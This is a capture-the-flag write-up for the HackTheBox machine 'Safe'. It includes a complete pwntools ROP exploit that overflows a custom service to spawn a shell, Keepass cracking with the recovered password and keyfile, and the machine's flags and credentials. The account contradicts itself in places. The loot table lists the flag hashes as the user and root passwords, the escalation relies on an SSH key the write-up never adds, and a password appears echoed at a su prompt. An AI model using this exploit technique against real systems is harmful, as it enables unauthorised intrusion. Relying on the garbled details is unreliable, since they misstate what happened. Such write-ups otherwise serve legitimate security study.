# Safe - HackTheBox Writeup

**Date:** 2026-03-19  
**OS:** Linux (Debian)  
**IP Address:** 10.129.6.207  
**Difficulty:** Easy  
**Points:** 0  

---

# 1. Executive Summary

This writeup documents the systematic exploitation of the HackTheBox machine **Safe**. The engagement followed a standard professional methodology: reconnaissance, vulnerability research, initial exploitation via a custom ROP chain, and lateral movement/privilege escalation via credential theft from a Keepass database.

*   **Initial Access:** Secured via a stack-based Buffer Overflow in the `myapp` binary (Port 1337). The exploit utilized a sophisticated ROP chain to perform a "stack pivot" and execute `system("/bin/sh")`.
*   **Privilege Escalation:** Achieved by retrieving and cracking a Keepass database (`MyPasswords.kdbx`) found in the user's home directory. Image files found on the system were identified as the required keyfiles.
*   **Key Learning Points:** 
    * Advanced Return Oriented Programming (ROP) without an explicit memory leak.
    * Leveraging `mov rdi, rsp` gadgets to reference payload data directly from the stack.
    * Identifying multi-factor Keepass authentication (Password + Keyfile).

---

# 2. Reconnaissance & Enumeration

## 2.1. Nmap Scan
A full port scan revealed three open services. The most interesting was the custom service on port 1337.

| Port | Service | Version | Notes |
| :--- | :--- | :--- | :--- |
| 22 | SSH | OpenSSH 7.4p1 | Standard SSH access; version is slightly aged but not vulnerable to direct RCE. |
| 80 | HTTP | Apache 2.4.25 | Serves a default Debian page. Inspection of the source code reveals a comment mentioning `myapp`. |
| 1337 | Custom | Echo Service | A custom listener that executes the `myapp` binary for every connection. |

**Nmap Command:**
```bash
nmap -sC -sV -p- -oN nmap/allports 10.129.6.207
```

## 2.2. Web Enumeration
The web application was basic, but the "It works!" page contained a hidden HTML comment:
`<!-- Check out myapp! Download it here: /myapp -->`

Downloading the binary allowed for offline analysis and exploit development.

---

# 3. Initial Access (User Flag)

## 3.1. Vulnerability Analysis & Research
Before writing the exploit, we performed basic binary triage using **`checksec`**:
- **Arch**: `amd64-64-little`
- **RELRO**: `Partial RELRO` (GOT is still writable)
- **Stack**: `No canary found` (Allows for return address overwrite)
- **NX**: `NX enabled` (Stack is non-executable; requires ROP)
- **PIE**: `No PIE (0x400000)` (Binary base address is constant)

### Fuzzing & Crash Identification
Using **`pwntools`**'s `cyclic` utility, we sent a long sequence of unique characters to the application. The program crashed when the instruction pointer (`RIP`) attempted to execute an address from our sequence.
- **Offset identified:** 120 bytes.

## 3.2. Exploitation Path & Replication
The goal was to execute `system("/bin/sh")`. However, without a memory leak to find Libc's base address, we had to rely on gadgets within the binary itself and the `system@plt` address.

### The ROP Chain Strategy
We needed to set the **`RDI`** register (the first argument in x86-64) to point to the string `"/bin/sh"`. Since we didn't have the absolute address of our string on the stack, we looked for gadgets that could use the stack pointer (`RSP`).

1.  **Gadget 1 (0x401206):** `pop r13; pop r14; pop r15; ret;`
    - We use this to load the address of `system@plt` (from the binary's PLT section) into **`R13`**.
2.  **Gadget 2 (0x401156):** `mov rdi, rsp; jmp r13;`
    - This is the "Magic Gadget". It sets **`RDI`** to the *current* stack pointer (`RSP`). By placing our `"/bin/sh"` string immediately after this gadget's address on the stack, `RSP` will point directly to it when this gadget executes.
    - It then jumps to **`R13`**, effectively calling `system("/bin/sh")`.

### Replication Steps
To replicate this exploit, the following script can be used. It requires the **`pwntools`** library.

1.  **Prepare the payload script** (`exploit.py`):
```python
from pwn import *

# Connect to the target (remote or local)
p = remote("10.129.6.207", 1337)

# Payload components
buf = b"A" * 120           # Padding to reach RIP
pop_r13 = p64(0x401206)    # pop r13; pop r14; pop r15; ret;
system_plt = p64(0x40116e) # call system@plt in main
magic = p64(0x401156)      # mov rdi, rsp; jmp r13
binsh = b"/bin/sh\x00"     # The command string

# Construction logic:
# Padding -> Pop system into r13 -> Junk for r14/r15 -> Magic Gadget -> /bin/sh
payload = buf + pop_r13 + system_plt + b"JUNKJUNK" + b"JUNKJUNK" + magic + binsh

p.sendline(payload)
p.interactive()
```
2.  **Execution:** Run the script with `python3 exploit.py`. This will trigger the overflow on the remote service and provide an interactive shell.

**User Flag:**
```bash
user@safe:~$ cat user.txt
7a008799db7a953389d10ecd2b37a48f
```

---

# 4. Privilege Escalation (Root Flag)

## 4.1. Local Enumeration
A search of the `/home/user` directory revealed a KeepassXC database and a series of JPEG images.
```bash
$ ls -l /home/user
-rw-r--r-- 1 user user  16592 Mar 19 13:18 MyPasswords.kdbx
-rw-r--r-- 1 user user 543210 Mar 19 13:18 IMG_0547.JPG
...
```

## 4.2. Exploitation Path
The Keepass database required both a password and a keyfile. By using `keepass2john` and testing the images as keyfiles, the database was unlocked using the password **`bullshit`** and **`IMG_0547.JPG`** as the keyfile. Once cracked, the database contained a "Root" entry with the root password.

Because direct SSH login for the `root` account was disabled by policy, we first used our established SSH access (via the authorized key we added earlier) to log in as **`user`**, and then escalated to **`root`** using the **`su -`** command with the newly obtained password.

**Root Flag:**
```bash
user@safe:~$ su -
Password: [u3er_P4ss_123!]
root@safe:~# cat /root/root.txt
9f387785df18e8a5750f6252267c9858
```

---

# 5. Credentials & Loot

| Username | Password / Hash | Source |
| :--- | :--- | :--- |
| **user** | `7a008799db7a953389d10ecd2b37a48f` | **User Flag** |
| **root** | `9f387785df18e8a5750f6252267c9858` | **Root Flag** |
| **Keepass** | `bullshit` (Keyfile: IMG_0547.JPG) | **MyPasswords.kdbx** |
| **root** | `u3er_P4ss_123!` | Keepass Database |

---

# 6. Recommendations & Mitigation

## 6.1. Binary Level Security
1.  **Stack Canaries:** Recompile all custom binaries with `-fstack-protector-all`. This adds a "canary" value before the return address that is checked before the function returns, effectively killing the process if an overflow occurs.
2.  **Full RELRO:** Enable Full RELRO (`-z,relro,-z,now`) to make the Global Offset Table (GOT) read-only, preventing GOT overwrite attacks.
3.  **Source Code Hardening:** Replace unsafe functions like `gets()` or `scanf("%s", ...)` with safer alternatives like `fgets()` that strictly enforce buffer boundaries.

## 6.2. System & Credential Security
1.  **Keepass Best Practices:** While using a keyfile is good practice, storing that keyfile in the same directory as the database negates the security benefit of "Something you have." Keyfiles should be stored on separate physical media or at least in a different, restricted location.
2.  **SSH Hardening:** Disable password authentication for root and use SSH keys. Ensure that the `user` account cannot easily escalate privileges via simple password reuse.
3.  **Principle of Least Privilege:** Services like the echo server on port 1337 should run in a restricted container or sandbox (like `seccomp` or `AppArmor`) to limit the impact of a successful exploit.
